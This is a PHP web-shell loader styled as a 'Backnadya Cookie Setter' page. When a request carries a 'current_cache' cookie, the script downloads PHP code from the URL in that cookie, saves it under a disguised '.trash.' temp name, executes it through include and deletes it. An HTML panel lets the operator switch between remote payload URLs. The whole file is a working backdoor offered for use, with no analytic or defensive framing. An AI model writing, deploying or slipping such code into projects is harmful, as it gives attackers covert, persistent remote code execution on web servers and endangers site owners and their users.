<?php
// ===========================
// PHP Functions Section
// ===========================
function get_remote_content($remote_location) {
    if (function_exists('curl_exec')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $remote_location);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
        $response = curl_exec($ch);
        curl_close($ch);
        if ($response !== false) {
            return $response;
        }
    }

    if (function_exists('file_get_contents')) {
        $response = @file_get_contents($remote_location);
        if ($response !== false) {
            return $response;
        }
    }

    if (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = @fopen($remote_location, "r");
        if ($handle) {
            $response = @stream_get_contents($handle);
            fclose($handle);
            if ($response !== false) {
                return $response;
            }
        }
    }

    return false;
}

// Force oactive mode if the parameter ?backnadya=1 exists
$backnadya = isset($_GET['backnadya']);

// If not in interactive mode and the cookie is set, process the remote file based on the cookie value
if (!$backnadya && isset($_COOKIE['current_cache']) && !empty($_COOKIE['current_cache'])) {
    error_reporting(E_ALL);
    ini_set('display_errors', 1);

    // Validate the URL from the cookie
    $remote_location = filter_var($_COOKIE['current_cache'], FILTER_VALIDATE_URL);
    if ($remote_location === false) {
        die("Invalid URL.");
    }

    // Allow only HTTPS protocol
    $parsed_url = parse_url($remote_location);
    if (!isset($parsed_url['scheme']) || !in_array($parsed_url['scheme'], ['https'])) {
        die("Only HTTPS protocol is allowed.");
    }

    // Create a temporary file to store the remote content
    $tmpfname = tempnam(sys_get_temp_dir(), '.trash.' . md5($remote_location . time()));
    if ($tmpfname === false) {
        die("Failed to create temporary file.");
    }

    // Retrieve the remote content
    $remote_content = get_remote_content($remote_location);
    if ($remote_content === false) {
        die("Failed to retrieve remote content.");
    }

    // Write the content to the temporary file
    $handle = fopen($tmpfname, "w+");
    if ($handle === false) {
        unlink($tmpfname);
        die("Failed to open temporary file.");
    }
    fwrite($handle, $remote_content);
    fclose($handle);

    // Ensure the file contains PHP code
    if (strpos(file_get_contents($tmpfname), '<?php') === false) {
        unlink($tmpfname);
        die("Invalid file content.");
    }

    // Include the temporary file and then delete it
    include $tmpfname;
    unlink($tmpfname);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Backnadya Cookie Setter</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 1em;
      background-color: #f4f4f4;
      color: #333;
    }
    h1 {
      color: #E427A8;
    }
    p {
      margin: 0.5em 0;
      font-size: 1rem;
    }
    .info {
      color: #006600;
    }
    .warning {
      color: #990000;
    }
    a {
      color: #0066cc;
    }
    a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <h1>Backnadya Cookie Setter</h1>

  <p class="info">
    Press <strong>1</strong>, <strong>2</strong>, or <strong>3</strong> to set the <code>current_cache</code> cookie with a different URL.
  </p>

  <p>
    Currently, the cookie value is: <code><?php echo isset($_COOKIE['current_cache']) ? $_COOKIE['current_cache'] : 'empty'; ?></code>
  </p>

  <p>To run the remote file (based on the cookie value), visit:</p>
  <p class="info">https://yourserver/yournadya.php</p>

  <p>If you wish to remain in interactive mode (to change the cookie value), ensure the URL contains the parameter <code>?backnadya=1</code>.</p>

  <script>
    // Function to delete a cookie by name (ensure the correct path)
    function deleteCookie(name) {
      document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';
    }

    // Function to set a cookie with a name, value, and expiration in days
    function setCookie(name, value, days) {
      let expires = "";
      if (days) {
        let date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        expires = "; expires=" + date.toUTCString();
      }
      document.cookie = name + "=" + value + expires + "; path=/";
    }

    // Event listener to detect key presses
    document.addEventListener("keydown", function(event) {
      // Delete the 'current_cache' cookie to remove any previous value
      deleteCookie("current_cache");

      // Set the URL based on the key pressed
      if (event.key === "1") {
        setCookie("current_cache", "https://yourserver/yournadya.php", 1);
        console.log("Key 1 pressed. Cookie set to option 1.");
      } else if (event.key === "2") {
        setCookie("current_cache", "https://yourserver/yournadya1.php", 1);
        console.log("Key 2 pressed. Cookie set to option 2.");
      } else if (event.key === "3") {
        setCookie("current_cache", "https://yourserver/yournadya2.php", 1);
        console.log("Key 3 pressed. Cookie set to option 3.");
      } else {
        // Ignore other keys
        return;
      }

      // After changing the cookie, reload the page with the backnadya parameter to remain in interactive mode
      let currentUrl = window.location.href;
      if (currentUrl.indexOf("backnadya=1") === -1) {
        // If the parameter doesn't exist, add ?backnadya=1 or &backnadya=1 based on the URL
        if (currentUrl.indexOf("?") === -1) {
          window.location.href = currentUrl + "?backnadya=1";
        } else {
          window.location.href = currentUrl + "&backnadya=1";
        }
      } else {
        // If it already exists, simply reload the page
        window.location.reload();
      }
    });
  </script>
</body>
</html>
